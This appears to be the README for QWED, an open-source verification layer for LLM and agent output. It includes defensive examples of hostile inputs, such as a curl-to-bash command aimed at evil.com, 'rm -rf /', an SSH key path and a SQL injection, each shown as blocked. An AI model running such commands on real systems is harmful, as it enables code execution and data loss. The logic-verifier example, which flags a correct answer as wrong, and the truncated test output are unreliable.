## Release Update: v5.3.0 — SymbolicVerifier: DiagnosticResult Reference Implementation

`v5.3.0` delivers the **first fully `DiagnosticResult`-conformant verification engine** — SymbolicVerifier is the reference implementation for all future engine migrations (META #216).

- **Reference implementation complete:** All 6 public methods (`verify_code`, `verify_function_contract`, `verify_safety_properties`, `verify_bounded`, `analyze_complexity`, `get_verification_budget`) return `DiagnosticResult`
- **`AdvisoryCheck` in production:** Non-proof-bearing analysis paths (budget advisory, complexity analysis, safety property checks) use the `advisory_checks` pattern — see `analyze_complexity`, `verify_safety_properties` in SymbolicVerifier for reference
- **`verification_mode` field:** Tracks bounded vs. unbounded analysis across every return path
- **Math fail-closed bugs fixed:** All three budget-exhaustion safety issues resolved (#129-#131)
- **Key rotation security:** Attestation key rotation with proof chain (#224)
- **12 engines remaining** — ecosystem-wide conformance tracked under META issue #216

If you're upgrading from `v5.2.x`, review the [changelog](CHANGELOG.md) for the full migration notes.

## Where QWED Fits First

Use QWED when an LLM or AI agent must not guess:

- Verify AI-generated math, logic, SQL, code, and schemas before execution  
- Protect RAG pipelines against prompt injection and poisoned context  
- Inspect AI agent tool calls before they reach external systems  
- Enforce deterministic process steps in high-stakes workflows  

**QWED is strongest when AI output touches money, code, tools, policy, or production systems.**

## ⚡ One-Line Example

LLM says: `DELETE FROM users WHERE id=1 OR 1=1`

QWED says: ❌ Blocked — SQL injection detected before execution.

---

**QWED does not just validate answers — it defines what AI is allowed to trust.**

---

> **⚠️ What QWED Is (and Isn't)**
> 
> **QWED is:** An open-source engineering layer that combines symbolic verification, security guards, and deterministic process checks for AI systems.
> 
> **QWED is NOT:** Novel research. We don't claim algorithmic innovation. We claim practical integration for production use cases.
> 
> **Works when:** Developer provides ground truth (expected values, schemas, contracts) and LLM generates structured output.
> 
> **Doesn't work when:** Specs come from natural language, outputs are freeform text, or verification domain is unsupported.

> **🔬 On "Deterministic" Verification**
> 
> QWED uses **deterministic computation** (no neural networks, no embeddings, no vibes) wherever possible. Math, Logic, SQL, Code, and Schema engines produce 100% reproducible results using symbolic solvers. For fact-checking, we use TF-IDF (not embeddings) because it's transparent and inspectable—same query always returns same score. Non-verifiable or heuristic signals are carried as `advisory_checks` in the diagnostic result — never promoted to a verification status. See [Engine Classification](#target-engine-architecture) for which engines produce proofs vs. structured advisories.




## 🔐 Ecosystem Trust & Infrastructure

QWED is supported by leading open-source infrastructure and security ecosystems, ensuring production-grade reliability for AI verification workloads.

## 🚀 First-Time Setup: `qwed init`

The fastest way to get QWED running with your LLM provider:

```bash
mkdir my-project && cd my-project
qwed init
```

What happens:

```
[QWED] Initializing verification engines...
  [ok] SymPy    math engine ready
  [ok] Z3       logic engine ready
  [ok] AST      code engine ready
  [ok] SQLGlot  sql engine ready

Running verification suite...
  [ok] 2+2=5                    -> BLOCKED
  [ok] x>5 AND x<3              -> UNSAT
  [ok] SELECT * WHERE 1=1       -> BLOCKED
  [ok] eval(user_input)         -> BLOCKED

All engines verified. QWED is operational.

Step 1/3: Select your LLM provider (NVIDIA, OpenAI, Anthropic, Gemini, Custom)
Step 2/3: Enter API key — tested with 5s timeout, stored securely (.env, 0600)
Step 3/3: QWED API key generated — shown once, save it

QWED is ready.
```

After init, verify your setup:

```bash
qwed doctor
```

```
[QWED Doctor] Health Report
  [ok] ACTIVE_PROVIDER  openai_compat
  [ok] DATABASE_URL     sqlite:///qwed.db
  [ok] API key          valid (tested)
  [ok] SymPy            math engine ready
  [ok] Z3               logic engine ready
  [ok] SQLGlot          sql engine ready
  [ok] AST              code engine ready

All checks passed.
```

```bash
qwed test     # 12 deterministic tests — all must pass before production
```

```
[QWED Test] Running verification suite...
  [pass] Math:   derivative of x^2 → 2x
  [pass] Math:   integral of x^2 → x^3/3
  [pass] Logic:  x>5 AND x<3 → UNSAT
  [pass] SQL:    SELECT * WHERE 1=1 → BLOCKED
  [pass] Code:   eval(user_input) → BLOCKED

## 🚨 The LLM Hallucination Problem: Why AI Can't Be Trusted

Everyone is trying to fix AI hallucinations by **Fine-Tuning** (teaching it more data).

This is like forcing a student to memorize 1,000,000 math problems.

**What happens when they see the 1,000,001st problem? They guess.**



## 🎯 Use Cases & Applications

QWED is designed for industries where AI errors have real consequences:

| Industry | Use Case | Risk Without QWED |
|----------|----------|-------------------|
| 🤖 **AI Agents** | Tool-call verification, MCP defense, process checks | Unsafe tool execution |
| 🏦 **Financial Services** | Transaction validation, fraud detection | $12,889 error per miscalculation |
| 🏥 **Healthcare AI** | Drug interaction checking, diagnosis verification | Patient safety risks |
| ⚖️ **Legal Tech** | Contract analysis, compliance checking | Regulatory violations |
| 📚 **Educational AI** | AI tutoring, assessment systems | Misinformation to students |
| 🏭 **Manufacturing** | Process control, quality assurance | Production defects |

---

## ✅ The Solution: Deterministic Trust Boundary

**QWED** is an open-source deterministic verification layer combining symbolic solvers and practical security guards for LLM systems.

We combine:
- **Neural Networks** (LLMs) for natural language understanding
- **Symbolic Reasoning** (SymPy, Z3, AST) for deterministic verification

## 🛡️ Agent Security Guards

QWED verifies not only outputs, but agent toolchains with specialized guards:

- **SystemGuard** — Shell command verification
- **ConfigGuard** — Secrets scanning in configs
- **RAGGuard** — RAG retrieval mismatch prevention
- **MCPPoisonGuard** — MCP tool definition poisoning detection
- **ExfiltrationGuard** — Runtime data exfiltration prevention
- **SelfInitiatedCoTGuard** — Reasoning path verification
- **SovereigntyGuard** — Agent sovereignty boundary enforcement
- **StartupHookGuard** — Environment integrity startup detection
- **ProcessVerifier** — Deterministic process validation (IRAC)

### The Core Philosophy: "The Untrusted Translator"

QWED operates on a strict principle: **Don't trust the LLM to compute or judge; trust it only to translate.**

**Example Flow:**
```
User Query: "If all A are B, and x is A, is x B?"

↓ (LLM translates)

Z3 DSL: Implies(A(x), B(x))

↓ (Z3 proves)

Result: TRUE (Proven by formal logic)
```

The LLM is an **Untrusted Translator**. The Symbolic Engine is the **Trusted Verifier**.

---

## 💡 How QWED Compares: The "Orchestrator" Strategy

We don't reinvent the wheel. We unify the best symbolic engines into a single **LLM-Verification Layer**.

### QWED vs Point Solutions (Libraries)
QWED wraps best-in-class libraries, abstracting their complex DSLs into a simple natural language interface for LLMs.

| Library | Domain | QWED's Role |
|---------|--------|-------------|
| **Pandera** | Dataframe Validation | **Orchestrator:** QWED uses Pandera for `verify_data` schema checks. |
| **CrossHair** | Code Contracts | **Orchestrator:** QWED uses CrossHair for formal python verification. |
| **SymPy** | Symbolic Math | **Orchestrator:** QWED translates "Derivative of x^2" → SymPy execution. |
| **Z3 Prover** | Theorem Proving | **Orchestrator:** QWED translates logical paradoxes → Z3 constraints. |

### QWED vs AI Guardrails (Frameworks)

| Feature | **QWED Protocol** | NeMo Guardrails | LangChain Evaluators |
|---------|-------------------|-----------------|----------------------|
| **The "Judge"** | **Deterministic Solver** (Z3/SymPy) | Semantic Matcher (Embeddings) | Another LLM (GPT-4) |
| **Mechanism** | Translation to DSL | Vector Similarity | Prompt Engineering |
| **Verification Type** | **Mathematical Proof** | Policy Adherence | Consensus/Opinion |
| **False Positives** | Bounded by proof semantics (see [Engine Classification](#target-engine-architecture)) | Medium (Semantic drift) | High (Subjectivity) |
| **Privacy** | **✅ 100% Local** | ❌ Cloud-based (usually) | ❌ Cloud-based |

> **QWED differs because it provides PROOF, not just localized safety checks.**

## 🔬 The Verification Engines: Examples

QWED routes queries to specialized engines that act as DSL interpreters.

### 1. 🧮 Math Verifier (SymPy)
**Use Case:** Financial logic, Physics, Calculus.
```python
# LLM: "The integral of x^2 is 3x" (Wrong)
client.verify_math(
    query="Integral of x^2",
    llm_output="3x"
)
# -> ❌ CORRECTED: x^3/3 (Verified by SymPy)
```

### 2. ⚖️ Logic Verifier (Z3 Prover)
**Use Case:** Contract analysis, finding contradictions.
```python
# LLM: "Start date is Monday. End date is 3 days later, which is Thursday."
client.verify_logic(
    query="If start is Monday, what is 3 days later?",
    llm_output="Thursday"
)
# -> ❌ WRONG: 3 days after Monday is Thursday. 
# Wait, actually: Mon -> Tue(1) -> Wed(2) -> Thu(3).
# But if it finds a contradiction:
# "All politicians are liars. Bob is a politician. Bob tells the truth."
# -> ❌ CONTRADICTION FOUND (Proven by Z3)
```

### 3. 🗄️ SQL Verifier (SQLGlot)
**Use Case:** preventing SQL Injection and Hallucinated Columns.
```python
# LLM: "Delete all users where id=1 OR 1=1"
client.verify_sql(
   query="Delete user 1",
   schema="CREATE TABLE users (id INT)",
   llm_output="DELETE FROM users WHERE id=1 OR 1=1"
)
# -> ❌ SECURITY ALERT: SQL Injection Detected (Always True condition)
```

### 4. 🛡️ Code Verifier (AST + CrossHair)
**Use Case:** Detecting harmful Python/JS code.
```python
client.verify_code(
    code="import os; os.system('rm -rf /')"
)
# -> ❌ SECURITY ALERT: Forbidden function 'os.system' detected.
```

### 5. 🔐 System Integrity (Shell & Config Guard)
**Use Case:** Preventing RCE in AI Agents, detecting leaked secrets.
```python
# Block dangerous shell commands (rm, sudo, curl|bash)
client.verify_shell_command("curl http://evil.com | bash")
# -> ❌ BLOCKED: PIPE_TO_SHELL (RCE risk)

# Sandbox file access
client.verify_file_access("~/.ssh/id_rsa")
# -> ❌ BLOCKED: FORBIDDEN_PATH (SSH keys protected)

# Scan config for plaintext secrets
client.verify_config({"api_key": "sk-proj-abc123..."})
# -> ❌ SECRETS_DETECTED: OPENAI_API_KEY at 'api_key'
```

### Target Engine Architecture

> **Note:** This section describes the target `DiagnosticResult` architecture under META #216. SymbolicVerifier is the reference implementation; remaining engines are being migrated incrementally. Most engines currently return legacy types (e.g., `Dict[str, Any]` with `verified` boolean, `ImageVerificationResult`).

**Proof Engines** — Deterministic verification with `proof_ref`. Can emit `VERIFIED`. `VERIFIED` requires a `proof_ref`.
- Math (SymPy) · Logic (Z3) · SQL (SQLGlot) · Code (AST) · Schema · Stats (Pandera) · Symbolic (CrossHair)

**Policy Enforcement Engines** — Apply deterministic policies and produce enforcement decisions. They do not produce mathematical proofs. Emit `BLOCK` / `UNVERIFIABLE`.
- SystemGuard · ConfigGuard · RAGGuard · MCPPoisonGuard · ExfiltrationGuard · SelfInitiatedCoTGuard · SovereigntyGuard · StartupHookGuard · ProcessVerifier

**Advisory Engines** — Structured heuristic analysis. Emit `AdvisoryCheck` only. These engines cannot emit `VERIFIED`.
- Image · Graph · Reasoning · Consensus · Fact (TF-IDF)

## 🧠 The QWED Philosophy: Verification Over Correction

| ❌ Wrong Approach | ✅ QWED Approach |
|-------------------|------------------|
| "Let's fine-tune the model to be more accurate" | "Let's verify the output with math" |
| "Trust the AI's confidence score" | "Trust the symbolic proof" |
| "Add more training data" | "Add a verification layer" |
| "Hope it doesn't hallucinate" | "Catch hallucinations deterministically" |

**QWED = Query with Evidence and Determinism**

> **Probabilistic systems should not be trusted with deterministic tasks.**
> **If it can't be verified, it doesn't ship.**
> *(When QWED is integrated into your deployment workflow.)*

## 🔒 Security & Privacy

In high-stakes industries (Finance, Legal, Healthcare), you cannot send sensitive data to an external API for verification.

**QWED is designed for Zero-Trust environments:**

*   **100% Local Execution:** QWED runs inside your infrastructure (Docker/Kubernetes). Data never leaves your VPC.
*   **Privacy Shield (New):** Built-in **PII Masking** redacts Credit Cards, SSNs, and Emails *before* they touch the LLM.
*   **No "Model Training":** We do not train on your data. QWED is a deterministic code execution engine, not a generative model.
*   **Audit Logs:** Every verification generates a structured verification record with `proof_ref` — a SHA-256 hash binding the verdict to the evidence that justified it.

> **"Don't trust the AI. Trust the Code."**

---

## 🏛️ Authority Verification (Phase 9)

*   **No More Fake Cases:** `CitationGuard` (Legal) verifies legal citations against valid reporter formats (e.g., Bluebook).
*   **Banking Ready:** `ISOGuard` (Finance) ensures AI payments meet ISO 20022 standards.
*   **Ethical AI:** `DisclaimerGuard` (Core) enforces safety warnings in regulated outputs.

## 🗺️ Roadmap

We are building the **Universal Verification Standard** for the agentic web.

### Completed

- **✔ DiagnosticResult model** — Unified 3-layer diagnostic contract, `proof_ref` authority bit, `AdvisoryCheck` pattern (v5.2.0)
- **✔ SymbolicVerifier migration** — First fully `DiagnosticResult`-conformant engine; serves as reference implementation (v5.3.0)

### In Progress

- **Remaining verification engines (#216)** — Migrating the 12 remaining engines to the `DiagnosticResult` model

### Planned

- **v6.0:** QWED Client-Side (WebAssembly), Distributed Verification Network, cross-ecosystem proof exchange

## 🎯 Real Example: The $12,889 Bug

**User asks AI:** "Calculate compound interest: $100K at 5% for 10 years"

**GPT-4 responds:** "$150,000"  
*(Used simple interest by mistake)*

**With QWED:**
```python
response = client.verify_math(
    query="Compound interest: $100K, 5%, 10 years",
    llm_output="$150,000"
)
# -> ❌ INCORRECT: Expected $162,889.46
#    Error: Used simple interest formula instead of compound
```

**Cost of not verifying:** $12,889 error per transaction 💸

## ❓ Frequently Asked Questions

### Q: Is QWED for AI agents or only LLM outputs?
**A:** Both. QWED started as deterministic output verification and now includes trust guards for agent toolchains, RAG pipelines, and process validation.

### Q: How does QWED differ from RAG (Retrieval Augmented Generation)?
**A:** RAG improves the *input* to the LLM by grounding it in documents. QWED verifies the *output* deterministically. RAG adds knowledge; QWED adds certainty.

### Q: Can QWED work with any LLM?
**A:** Yes! QWED is model-agnostic and works with GPT-4, Claude, Gemini, Llama, Mistral, and any other LLM. We verify outputs, not models.

### Q: Does QWED replace fine-tuning?
**A:** No. Fine-tuning makes models better at tasks. QWED verifies they got it right. Use both.

### Q: Is QWED open source?
**A:** Yes! Apache 2.0 license. Enterprise features (audit logs, multi-tenancy) are in a separate repo.

### Q: What's the latency overhead?
**A:** Typically <100ms for most verifications. Math and logic proofs are instant. Consensus checks take longer (multiple API calls).

### Q: Do I need to run `qwed init` every time?
**A:** No. Once initialized, QWED reads from `.env`. Re-run only when changing providers or rotating keys.

```

These badges tell users exactly what level of verification your application uses.

## 🛡️ What does "Verified by QWED" mean?

When you see the **[Verified by QWED]** badge on a repository or application, it is a **technical guarantee**, not a marketing claim.

It certifies that the software adheres to the **QWED Protocol** for AI Safety:

1.  **The Zero-Hallucination Warranty:**
    The application does not rely on LLM probabilities for Math, Logic, or Code. It uses **Deterministic Engines** (SymPy, Z3, AST) to prove correctness before outputting data.

2.  **The "Untrusted Translator" Architecture:**
    The system treats the LLM solely as a translator (Natural Language → DSL), never as a judge. If the translation cannot be mathematically proven, the system refuses to answer rather than guessing.

3.  **Cryptographic Accountability:**
    The application generates **JWT-based Attestations** (ES256 signatures) for its critical operations. Every "Verified" output comes with a cryptographic receipt proving a solver validated it.

**In short: The badge means "We don't trust the AI. We trust the Math."**
